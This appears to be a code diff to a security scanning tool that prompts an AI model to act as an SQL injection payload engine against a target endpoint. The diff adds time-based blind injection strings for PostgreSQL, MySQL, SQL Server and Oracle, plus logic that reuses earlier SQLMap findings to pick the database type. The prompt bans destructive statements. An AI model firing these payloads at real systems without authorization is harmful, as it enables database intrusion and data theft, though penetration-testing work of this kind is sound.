@@ -654,8 +654,11 @@ _PAYLOAD_SYSTEM = """你是SQL注入Payload构造引擎。请"模仿"当前接�
    probe_evidence 里若 quote 报错而 dquote 不报错（引号奇偶法），说明参数确在引号内且单引号可控
 2) 布尔向量必须成对生成：payload 为永真（如 '1'='1'），false_variant 为同型永假（如 '1'='2'），两者除真假条件外逐字符同构，否则对照无意义
 3) SQLite：可用 || 拼接、sqlite_version()、sqlite_master；注释用 -- ；没有 sleep()
-4) PostgreSQL：可用 ::text、UNION ALL
-5) MySQL：可用 updatexml/sleep 等（无破坏性语句）
+4) PostgreSQL：可用 ::text、UNION ALL；时间盲注用 pg_sleep(n)（如 `' AND (SELECT 1 FROM pg_sleep(3))=1-- `）
+5) MySQL：可用 updatexml/sleep(n)/benchmark；时间盲注用 sleep(n)
+5b) 其他 DBMS 的时间盲注函数：SQL Server 用 `WAITFOR DELAY '0:0:3'`；
+    Oracle 用 `dbms_pipe.receive_message(('x'),3)`；SQLite 无 sleep，改用布尔/重计算判据。
+    **time 向量必须按 likely_dbms 选对应延时函数**；likely_dbms=unknown 时最多给 2 种库的变体，不要只给 sleep。
 6) union 向量：按 probe_evidence 猜列数，全部列填同版本函数（如 sqlite_version()），列数不匹配的报错本身也是证据
 7) payload 只是单参数值；最多 5 条；严禁 drop/delete/truncate/update/insert/alter/os-shell
 8) 参考 kb_success_samples 的思路与风格做变形，不要原样照抄一条就结束
@@ -750,6 +753,17 @@ def generate_payloads(db: Session, endpoint: Endpoint, waf_profile,
         blob = " ".join((p.get("snippet") or "") for p in probes).lower()
         if "sqlite" in blob or "unrecognized token" in blob:
             likely_dbms = "sqlite"
+    if likely_dbms == "unknown":
+        # 探针没给出 DBMS 时，复用该接口已有的漏洞/SQLMap 结论（避免总是只生成 sleep）
+        try:
+            from app.models.vuln import Vulnerability
+            v = (db.query(Vulnerability)
+                 .filter(Vulnerability.endpoint_id == endpoint.id)
+                 .order_by(Vulnerability.id.desc()).first())
+            if v and v.dbms:
+                likely_dbms = v.dbms
+        except Exception:
+            pass
 
     client = get_ai_client(db)
     payloads: list[dict] = []
